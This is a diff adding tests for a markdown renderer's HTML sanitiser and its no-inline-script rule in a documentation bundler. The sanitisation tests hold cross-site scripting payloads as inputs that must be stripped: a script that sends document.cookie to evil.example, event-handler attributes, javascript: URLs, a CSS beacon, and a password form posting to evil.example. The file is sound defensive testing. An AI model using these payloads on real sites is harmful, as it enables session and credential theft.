@@ -17,6 +17,7 @@ import { join } from 'node:path';
 
 import { buildBundle, packBundle, BUNDLE_MANIFEST } from './bundle.js';
 import { InputError, parseDocsInput, validateDocs } from './inputs.js';
+import { renderMarkdown } from './markdown.js';
 
 const SAMPLE = `# Service Overview
 
@@ -185,6 +186,20 @@ try {
     assert.ok(existsSync(join(stage, 'my-service', 'assets', 'mermaid.min.js')), 'mermaid not vendored');
   });
 
+  check('ships the mermaid init as a file, so the document has no inline script', () => {
+    assert.match(html, /<script src="assets\/mermaid-init\.js">/);
+    assert.ok(
+      existsSync(join(stage, 'my-service', 'assets', 'mermaid-init.js')),
+      'mermaid init not written',
+    );
+    // Every <script> must carry a src. An inline one would force the
+    // marketplace's CSP to allow script-src 'unsafe-inline', which would allow
+    // an injected script too.
+    for (const [tag] of html.matchAll(/<script\b[^>]*>/g)) {
+      assert.match(tag, /\bsrc=/, `inline <script> in the document: ${tag}`);
+    }
+  });
+
   check('ships the doc stylesheet alongside the page', () => {
     assert.match(html, /<link rel="stylesheet" href="assets\/doc\.css">/);
     const css = readFileSync(join(stage, 'my-service', 'assets', 'doc.css'), 'utf8');
@@ -195,6 +210,108 @@ try {
   check('packs a tarball with bundle.json at the root', () => {
     const tar = packBundle(stage, join(root, 'out', 'dist.tar.gz'));
     assert.ok(existsSync(tar));
+  });
+
+  // ── Sanitisation ───────────────────────────────────────────────────────────
+  //
+  // markdown-it runs with html:true, and the result is re-hosted on the
+  // knowledge base's own origin next to every other doc. Anything that executes
+  // here executes against all of them, so the allowlist is asserted rather than
+  // described. Each case is markdown a doc repo could commit today.
+  console.log('\nSanitisation');
+
+  const rendered = (md) => renderMarkdown(md).html;
+
+  check('strips a raw <script> block', () => {
+    const html = rendered('Intro\n\n<script>fetch("https://evil.example?c="+document.cookie)</script>\n');
+    assert.doesNotMatch(html, /<script/i);
+    assert.doesNotMatch(html, /evil\.example/);
+    assert.match(html, /Intro/, 'surrounding prose must survive');
+  });
+
+  check('strips event-handler attributes', () => {
+    const html = rendered('<img src="x.png" onerror="alert(1)">\n\n<div onclick="alert(2)">text</div>\n');
+    assert.doesNotMatch(html, /onerror/i);
+    assert.doesNotMatch(html, /onclick/i);
+    assert.doesNotMatch(html, /alert\(/);
+    assert.match(html, /<img[^>]+src="x\.png"/, 'the image itself is legitimate content');
+  });
+
+  check('strips javascript: and data: URLs from raw HTML', () => {
+    const html = rendered('<a href="javascript:alert(1)">click</a>\n\n<img src="data:text/html,<script>alert(1)</script>">\n');
+    assert.doesNotMatch(html, /javascript:/i);
+    assert.doesNotMatch(html, /data:text\/html/i);
+    assert.match(html, /click/, 'link text is kept even though the href is dropped');
+  });
+
+  check('strips inline <style> and style attributes', () => {
+    // CSS is not inert: it can exfiltrate through url(), and absolute positioning
+    // lets a doc cover the marketplace masthead.
+    const html = rendered('<style>body{background:url("https://evil.example/beacon")}</style>\n\n<p style="position:fixed;inset:0">covered</p>\n');
+    assert.doesNotMatch(html, /<style/i);
+    assert.doesNotMatch(html, /evil\.example/);
+    assert.doesNotMatch(html, /style="/);
+    assert.match(html, /covered/);
+  });
+
+  check('strips iframes, objects and form controls', () => {
+    const html = rendered('<iframe src="https://evil.example"></iframe>\n\n<form action="https://evil.example"><input name="password" type="password"></form>\n');
+    assert.doesNotMatch(html, /<iframe/i);
+    assert.doesNotMatch(html, /<form/i);
+    assert.doesNotMatch(html, /type="password"/i);
+  });
+
+  check('keeps the markdown features the contract promises', () => {
+    const html = rendered([
+      '# Heading',
+      '',
+      '- [x] done',
+      '- [ ] todo',
+      '',
+      '| a | b |',
+      '|---|---|',
+      '| 1 | 2 |',
+      '',
+      '```js',
+      'const x = 1;',
+      '```',
+      '',
+      '```mermaid',
+      'flowchart LR',
+      '  a --> b',
+      '```',
+      '',
+      '**bold** and [link](https://example.com) and `code`',
+    ].join('\n'));
+
+    assert.match(html, /<h1[^>]*id="heading"/, 'heading anchors');
+    assert.match(html, /class="mp-anchor"/, 'anchor permalinks');
+    assert.match(html, /task-list-item/, 'task lists');
+    // Attribute order is not stable through the sanitiser, so assert each
+    // independently rather than pinning a sequence.
+    const checkbox = html.match(/<input\b[^>]*>/);
+    assert.ok(checkbox, 'task-list checkbox');
+    assert.match(checkbox[0], /type="checkbox"/, 'checkbox type');
+    assert.match(checkbox[0], /\bdisabled\b/, 'task-list checkboxes stay disabled');
+    assert.match(html, /<label class="task-list-item-label"/, 'checkbox keeps its label');
+    assert.match(html, /<table>/, 'tables');
+    assert.match(html, /<code class="hljs language-js">/, 'highlighted code');
+    assert.match(html, /hljs-keyword/, 'highlight.js spans');
+    assert.match(html, /<pre class="mermaid">flowchart LR/, 'mermaid sources');
+    assert.match(html, /<strong>bold<\/strong>/, 'inline formatting');
+    assert.match(html, /rel="noopener noreferrer"/, 'external link hardening');
+  });
+
+  check('keeps benign structural HTML an author hand-writes', () => {
+    const html = rendered('<details><summary>More</summary>\n\n<p>Body</p>\n\n</details>\n');
+    assert.match(html, /<details>/);
+    assert.match(html, /<summary>More<\/summary>/);
+    assert.match(html, /Body/);
+  });
+
+  check('adds rel=noopener to a hand-written target=_blank link', () => {
+    const html = rendered('<a href="https://example.com" target="_blank">out</a>\n');
+    assert.match(html, /rel="noopener noreferrer"/);
   });
 } finally {
   rmSync(root, { recursive: true, force: true });
